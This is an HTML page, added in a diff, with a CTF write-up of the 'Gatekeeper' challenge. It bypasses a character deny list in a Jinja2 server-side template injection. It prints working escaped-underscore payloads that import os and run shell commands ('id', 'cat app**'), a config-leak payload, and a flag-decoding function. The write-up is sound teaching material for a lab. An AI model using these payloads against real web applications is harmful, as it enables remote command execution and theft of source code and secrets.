@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 21 Dec. 2022 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Advent of CTF - Challenge 17</title>
+<meta name="author" content="Arjen Wiersma" />
+<meta name="generator" content="Org Mode" />
+<meta description='Writings by Arjen'/>
+<link rel='alternate' type='application+rss/xml' title='Writings by Arjen' href='/posts/rss.xml'/>
+<link rel="stylesheet" href="../../../css/theme.css?v=20216e086cf8a20ead56908f3be0bcda6af2531ec1a68c9058ee7495590f57ea" type="text/css">
+</head>
+<body>
+<main id="content" class="content">
+<header>
+<h1 class="title">Advent of CTF - Challenge 17</h1>
+<p class="subtitle" role="doc-subtitle">&ldquo;Gatekeeper&rdquo;</p>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orge3ee1a4">Challenge</a></li>
+<li><a href="#org9cfd653">Solution</a></li>
+</ul>
+</div>
+</nav>
+
+<section id="outline-container-orge3ee1a4" class="outline-2">
+<h2 id="orge3ee1a4">Challenge</h2>
+<div class="outline-text-2" id="text-orge3ee1a4">
+<p>
+This challenge is the same as <a href="../challenge-16/index.html">Challenge 16</a>, but now the input is heavily filtered.
+</p>
+
+<p>
+What you will learn:
+</p>
+
+<ul class="org-ul">
+<li>Bypassing filters</li>
+</ul>
+</div>
+</section>
+
+<section id="outline-container-org9cfd653" class="outline-2">
+<h2 id="org9cfd653">Solution</h2>
+<div class="outline-text-2" id="text-org9cfd653">
+
+<figure id="orge3a1c9d">
+<img src="index_att/start.png" alt="start.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>The start of the challenge</figcaption>
+</figure>
+
+<p>
+Attempting to use the same payloads as before will result in an error message saying that the entered emoji is on a deny list.
+</p>
+
+
+<figure id="orgf236cab">
+<img src="index_att/denied.png" alt="denied.png">
+
+<figcaption><span class="figure-number">Figure 2: </span>Denied</figcaption>
+</figure>
+
+<p>
+Apparently there is some form of character checking happening. Running through various combinations will lead to a list of <code>._"</code> and the word <code>config</code>.
+</p>
+
+<p>
+In fact, in the challenge code this is implemented as following:
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>The not allowed characters</label><pre class="src src-python"><span class="org-keyword">if</span> <span class="org-string">".' in p or '_' in p or "'" in p or '</span>config<span class="org-string">' in p:</span>
+</pre>
+</div>
+
+<p>
+The cheat sheet on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass">Payload All The Things</a> has a great reference on bypassing filters. Following this guide will get you most of the way. The final payload that is suggested is:
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>Payload all the things payload</label><pre class="src src-javascript">{{request|attr(<span class="org-string">"application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')</span>
+<span class="org-string">('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|</span>
+<span class="org-string">attr('popen')('id')|attr('read')()}}</span>
+</pre>
+</div>
+
+<p>
+But obviously there are illegal characters in it. The <code>"</code> can be replaced with <code>"</code> however and this payload will work.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Adjusted payload for allowed characters</label><pre class="src src-javascript">{{request|attr(<span class="org-string">"application"</span>)|attr(<span class="org-string">"\x5f\x5fglobals\x5f\x5f"</span>)|attr(<span class="org-string">"\x5f\x5fgetitem\x5f\x5f"</span>)
+  (<span class="org-string">"\x5f\x5fbuiltins\x5f\x5f"</span>)|attr(<span class="org-string">"\x5f\x5fgetitem\x5f\x5f"</span>)(<span class="org-string">"\x5f\x5fimport\x5f\x5f"</span>)(<span class="org-string">"os"</span>)|
+  attr(<span class="org-string">"popen"</span>)(<span class="org-string">"id"</span>)|attr(<span class="org-string">"read"</span>)()}}
+</pre>
+</div>
+
+
+<figure id="org17009fb">
+<img src="index_att/ssti-bypass-id.png" alt="ssti-bypass-id.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Bypassing the deny list</figcaption>
+</figure>
+
+<p>
+From here the challenge is the same as the previous one.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>Payload to get the sources</label><pre class="src src-javascript">{{request|attr(<span class="org-string">"application"</span>)|attr(<span class="org-string">"\x5f\x5fglobals\x5f\x5f"</span>)|attr(<span class="org-string">"\x5f\x5fgetitem\x5f\x5f"</span>)
+  (<span class="org-string">"\x5f\x5fbuiltins\x5f\x5f"</span>)|attr(<span class="org-string">"\x5f\x5fgetitem\x5f\x5f"</span>)(<span class="org-string">"\x5f\x5fimport\x5f\x5f"</span>)(<span class="org-string">"os"</span>)|
+  attr(<span class="org-string">"popen"</span>)(<span class="org-string">"cat app**"</span>)|attr(<span class="org-string">"read"</span>)()}}
+</pre>
+</div>
+
+<p>
+The source does not contain the flag however, this needs to be taken from the <code>config</code> variable again. Searching the internet will yield several ways of accessing the config dictionary. Below is one.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>A bypass for config</label><pre class="src src-javascript">{{self|attr(<span class="org-string">"\x5f\x5fdict\x5f\x5f"</span>)}}
+</pre>
+</div>
+
+<p>
+In the source code the magic function is just a little bit different from the last one, but the proces is the same; extract from the source and run in a python shell.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>The magic function</label><pre class="src src-python"><span class="org-keyword">def</span> <span class="org-function-name">magic</span>(flag, key): 
+    <span class="org-keyword">return</span> <span class="org-string">''</span>.join(<span class="org-builtin">chr</span>(x ^ <span class="org-builtin">ord</span>(flag[x]) ^ <span class="org-builtin">ord</span>(key[x]) ^ <span class="org-builtin">ord</span>(key[::-1][x])) <span class="org-keyword">for</span> x <span class="org-keyword">in</span> <span class="org-builtin">range</span>(<span class="org-builtin">len</span>(flag)))
+
+<span class="org-variable-name">flag</span>=<span class="org-string">"C\x1eS\x1dwsef}j\x057i\x7fo{D)'dO,+sutm3F"</span>
+magic(flag, <span class="org-string">"46e505c983433b7c8eefb953d3ffcd196a08bbf9"</span>)
+</pre>
+</div>
+
+<p>
+Go and get the badge as well.
+</p>
+
+
+<figure id="orgd8e127c">
+<img src="./index_att/badge.png" alt="badge.png">
+
+</figure>
+
+
+<p>
+Go back to the <a href="../../../index.html">homepage</a>.
+</p>
+</div>
+</section>
+</main>
+<footer id="postamble" class="status">
+<p class="author">Author: Arjen Wiersma</p>
+<p class="date">Created: 21 Dec. 2022</p>
+</footer>
+</body>
+</html>
